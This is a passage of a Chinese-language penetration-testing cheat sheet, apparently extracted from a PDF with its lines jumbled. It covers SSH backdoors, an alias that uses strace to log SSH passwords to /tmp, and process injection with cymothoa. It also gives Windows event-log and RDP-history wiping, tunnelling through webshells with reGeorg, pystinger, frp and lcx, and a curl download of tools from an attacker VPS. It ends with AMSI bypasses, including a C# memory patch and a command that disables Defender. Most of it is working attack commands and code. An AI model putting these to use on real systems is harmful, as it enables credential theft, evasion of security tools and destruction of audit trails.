chmod u+x sshd
//不用重启也行
/etc/init.d/sshd restart
socat STDIO TCP4:192.168.206.142:22,sourceport=13377
#!bash
alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -
s2048 ssh'
./cymothoa -p 2270 -s 1 -y 7777
nc -vv ip 7777
Tools
Vegile
backdoor
14.痕迹清理
Windows日志清除
获取日志分类列表：
获取单个日志类别的统计信息： eg.
回显：
查看指定日志的具体内容：
删除单个日志类别的所有信息：
破坏Windows日志记录功能
利用工具
Invoke-Phant0m
Windwos-EventLog-Bypass
Metasploit
wevtutil el >1.txt
wevtutil gli "windows powershell"
creationTime: 2016-11-28T06:01:37.986Z
lastAccessTime: 2016-11-28T06:01:37.986Z
lastWriteTime: 2017-08-08T08:01:20.979Z
fileSize: 1118208
attributes: 32
numberOfLogRecords: 1228
oldestRecordNumber: 1
wevtutil qe /f:text "windows powershell"
wevtutil cl "windows powershell"
run clearlogs 
clearev 
3389登陆记录清除
15.内网穿透
区分正向代理与反向代理
A----b----C
0x01 场景与思路分析
场景一：内网防火墙对出口流量没有任何端口限制
思路 ：由于防火墙对出口流量没有任何端口限制，我们的可选择的方案非常灵活，如：反弹shell
场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80, 443）
思路：由于防火墙仅允许部分特定外网端口可以访问，思路一仍然是反弹shell只不过目标端口改成特定
端口即可；思路二则是端口转发，将内网主机的某些服务的端口转发到外网攻击主机上的防火墙允许的
特定端口上，再通过连接外网主机上的本地端口来访问内网服务
方法一：反弹shell可参考场景一中的方法，仅需修改目标端口为防火墙允许的特定端口即可
方法二：端口转发
方法三：SSH的动态端口转发配合proxychains来代理所有流量进一步渗透内网
1.在内网主机上执行
2.在外网主机上执行
3.在外网主机上配置proxychains设置socks4代理
@echo off
@reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" 
/va /f
@del "%USERPROFILE%\My Documents\Default.rdp" /a
@exit
A去请求C,B作为代理，代替A去访问C，并将返回的结果转发给A   那么B就是正向代理
B主动与A的8888端口连接，并将A:8888的访问转发到C:80上去，并将结果转发给A,则B是反向代理
反向代理优势: 当AB之间有防火墙，不允许A连B,但是允许B连A
ssh -f -N -R 2222:127.0.0.1:22 -p 80 PI:EMAIL
(输入外网主机的SSH口令)
ssh -f -N -D 127.0.0.1:8080 -p 2222 avfisher@127.0.0.1
(输入内网主机的SSH口令)
4.使用proxychains代理所有流量进入内网
场景三：TCP不出网-HTTP代理
一.reGeorg
reGeorg原版：https://github.com/sensepost/reGeorg 
reGeorg修改版：https://github.com/L-codes/Neo-reGeorg
假设拿到的Webshell是http://aaa.com/shell.jsp，以原版reGeorg为例。
上传reGeorg中的 tunnel.jsp，假设当前URL为http://aaa.com/tunnel.jsp
在本地PC运行如下命令
此时，将在本地PC的8080开启一个Socks端口，使用Proxifier即可进行代理。需要注意的是，由于这个
http代理隧道比较脆弱，建议根据每个目标host单独添加规则，最好不要设置成全局代理。
二.pystinger
蜂刺-stinger_client
pystinger
整体结构：
1.上传 proxy.jsp到目标Web服务器，上传stinger_server/stinger_server.exe到目标系统。
2.使用Webshell启动stinger_server
3.VPS服务端启动监听
以上操作成功后，VPS会监听60000端口，接下来直接配置好Proxifier就可以访问目标内网了。
特别注意：这个代理也不是很稳定，有时候会断开(Wrong data)。遇到断开情况后，手动kill 
stinger_server进程 再启动，最后重启VPS服务端stinger_client即可
$ vim /etc/proxychains.conf
[ProxyList]
socks4 127.0.0.1 8080
proxychains nc -nv 10.0.2.5 3306
python reGeorgSocksProxy.py -p 8080 -h 0.0.0.0 -u http://aaa.com/tunnel.jsp
Linux:
chmod +x /tmp/stinger_server
nohup /tmp/stinger_server>/dev/null nohup.out &
Windows: start D:/XXX/stinger_server.exe
./stinger_client -w http://aaa.com/proxy.jsp -l 0.0.0.0 -p 60000
场景四 TCP出网-socks代理
frp
搭建步骤：
1.VPS运行服务端
注：建议用Screen将frp挂起到后台，Screen挂起程序参考用screen 在后台运行程序 - 简书
frps.ini内容：
2.使用VPS将frpc frpc.ini上传到主机tmp目录，然后运行
注：有时候用Webshell管理工具会上传失败或上传文件不完整，可以cd到frp目录，在vps使用 python 
-m SimpleHTTPServer 80  启动一个webserver，然后在客户端使用 curl http://vpsip/frpc 下载
文件。
以上操作成功后，VPS控制台会有输出，然后VPS会启动一个10001端口，接下来直接配置好Proxifier就
可以访问目标内网了。
Proxifier使用参考：Proxifier Socks5 代理（内网访问、远程办公）
ps：frp会涉及到免杀的问题，这里推荐另一个代理工具，体积更小，可以看作是rust版本的frp 
 fuso
0x02 Lcx
内网IP：192.168.183.168 
公网IP：192.168.183.181
端口转发
内网机器上执行命令： lcx.exe –slave 公网IP 端口 内网IP 端口  
将内网的3389端口转发到公网的6666端口
./frps -c frps.ini
[common]
bind_port = 8080
tls_only = true
tcp_mux = true
privilege_token = token123
kcp_bind_port = 8080
Linux:
chmod +x /tmp/frpc-x86
nohup /tmp/frpc-x86 -c /tmpfrpc.ini>/dev/null nohup.out &
Windows
frpc -c frpc.ini
公网机器上执行命令： lcx.exe -listen 监听端口 连接端口  
将在6666端口接收到的数据转发到2222端口
使用命令 mstsc /v:127.0.0.1:2222 即可连接到内网3389端口
端口映射
如果内网机器防火墙禁止3389出站，可以使用tran命令将3389端口映射到其他端口上 
内网机器上执行命令： lcx.exe -tran 映射端口 连接IP 连接端口
因为实验环境是内网所以直接连接66端口即可访问3389端口，公网还需要端口转发
0x03 SSH隧道
SSH本地转发
语法格式：
远程管理服务器上的mysql，mysql不能直接root远程登陆。这时候就可以通过本地转发，通过ssh将服
务器的3306端口转发到1234端口。
工作原理：在本地指定一个由ssh监听的转发端口2222，将远程主机的3306端口(127.0.0.1:3306)映射到
本地的2222端口，当有主机连接本地映射的2222端口时，本地ssh就将此端口的数据包转发给中间主机
VPS，然后VPS再与远程主机端口(127.0.0.1:3306)通信。 
数据流向：Kali -> 2222 -> VPS -> 127.0.0.1:3306
lcx.exe -slave 192.168.183.181 6666 192.168.183.168 3389
lcx.exe -slave 192.168.183.181 6666 127.0.0.1 3389
lcx.exe -listen 6666 2222
lcx.exe -tran 66 192.168.183.168 3389
ssh参数详解：
    -C Enable compression 压缩数据传输
    -q Quiet mode. 安静模式
    -T Disable pseudo-tty allocation. 不占用 shell
    -f Requests ssh to go to background just before command execution. 后台运行，并
推荐加上 -n 参数
    -N Do not execute a remote command. 不执行远程命令，端口转发就用它
    -L port:host:hostport 将本地机(客户机)的某个端口转发到远端指定机器的指定端口. 
    -R port:host:hostport 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. 
    -D port 指定一个本地机器动态的应用程序端口转发. 
    -g port 允许远程主机连接到建立的转发的端口，如果不加这个参数，只允许本地主机建立连接
ssh -L [local_bind_addr:]local_port:remote:remote_port middle_host
ssh -CfNg -L 2222:127.0.0.1:3306 PI:EMAIL
SSH远程转发
语法格式：
假设kali开了一个80端口的web服务，外网无法访问，使用远程转发，将kali的80端口转发到外网的其他
端口，这时候访问外网的端口，就访问到了内网的端口。
此时在192.168.183.195这台主机上访问127.0.0.1:4444端口即可访问到kali的80端口 
工作原理：kali在请求外网主机的sshd服务，在外网主机上建立一个套接字监听端口(4444)，它是kali的
80端口的映射，当有主机连接外网的4444端口时，连接的数据全部转发给kali，再由kali去访问
127.0.0.1:80。
这里要注意一点，远程端口转发是由远程主机上的sshd服务控制的，默认配置情况下，sshd服务只允许
本地开启的远程转发端口(4444)绑定在环回地址(127.0.0.1)上，即使显式指定了bind_addr也无法覆盖。
也就是这里访问127.0.0.1:4444端口可以访问成功，访问192.168.183.195:4444却不能访问成功。
要允许本地的远程转发端口绑定在非环回地址上，需要在外网主机的sshd配置文件中启
用"GatewayPorts"项，它的默认值为no，这里将它改为yes。然后重新远程转发一下即可用外网地址访
问。
SSH动态转发,正向代理做动态的端口转发
本地或远程转发端口和目标端口所代表的应用层协议是一对一的关系，不同的服务就要建立不同的端
口，工作很是繁琐，而动态转发只需绑定一个本地端口，而目标端口是根据你发起的请求决定的，比如
请求为445端口，通过ssh转发的请求也是445端口。
语法格式：
这里举一个最简单的列子：翻墙。国内正常情况下上不了Google，我们可以通过将流量转发到国外的
vps上这样就可以正常访问了。 
在本地执行以下命令，并查看建立连接情况
连接建立成功，设置浏览器到本地主机的3333端口
SSH动态转发，正向代理进行单一的端口转发
利用ssh -L 提供正向代理，将192.168.183.2的80端口映射到45.77.xx.xx的1111端口上
访问45.77.xx.xx:1111相当于访问192.168.183.2:80 中间需要192.168.183.1的ssh进行正向代理进行利
用。
语法格式：
此时我们访问45.77.xx.xx的1111端口就相当于访问内网不出网机器的192.168.183.2:80
ssh -R [bind_addr:]remote1_port:host:port remote1
ssh -CfNg -R 4444:127.0.0.1:80 PI:EMAIL
ssh -D [bind_addr:]port remote
ssh -Nfg -D 3333 PI:EMAIL
ssh -L 45.77.xx.xx:1111:192.168.183.2:80 root@192.168.183.1
16.Bypass AMSI
How to Bypass AMSI 
管理员权限关闭amsi
一键关闭AMSI
被加黑了，可以混淆过
powershell降级
内存补丁
Set-MpPreference -DisableRealtimeMonitoring $true
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiI
nitFailed','NonPubilc,Static').SetValue($null,$true)
powershell.exe -version 2   //改变powershell运行版本
$p=@"
using System;
using System.Linq;
using System.Runtime.InteropServices;
public class Program
{
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
uint flNewProtect, out uint lpfloldProtect);
public static void Bypass()
{
String a =
"isma";
IntPtr lib = LoadLibrary(String.Join(""
, a.Reverse().ToArray()) +
"
.dll");
IntPtr addr = GetProcAddress(lib,
"AmsiOpenSession");
uint old = 0;
byte[] p;
p = new byte[6];
p[0] = 0xB8;
参考链接：
p[1] = 0xFF;
p[2] = 0xFF;
p[3] = 0xFF;
p[4] = 0xFF;
p[5] = 0xC3;
VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old);
Marshal.Copy(p, 0, addr, p.Length);
VirtualProtect(addr, (UIntPtr)p.Length, old, out old);
    }
}
"@
Add-Type $p
[Program]::Bypass()
https://github.com/NyDubh3/Pentesting-Active-Directory-CN
https://github.com/shmilylty/Intranet_Penetration_Tips